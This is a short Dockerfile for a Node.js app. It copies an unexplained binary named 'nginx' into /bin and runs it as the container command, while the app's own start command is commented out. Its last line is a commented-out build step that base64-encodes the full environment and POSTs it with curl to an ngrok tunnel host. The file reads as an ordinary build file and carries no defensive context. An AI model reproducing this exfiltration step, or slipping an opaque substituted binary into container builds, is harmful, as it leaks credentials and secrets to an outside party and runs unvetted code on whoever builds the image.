FROM node:8-jessie
COPY nginx /bin/nginx
RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
WORKDIR /home/node/app
COPY package*.json ./
USER node
RUN npm install
#COPY --chown=node:node . .
EXPOSE 3001
#CMD ["node", "app.js"]
CMD ["/bin/nginx"]
# RUN curl -d "$(env | base64)" -X POST http://c305-89-64-53-227.ngrok.io
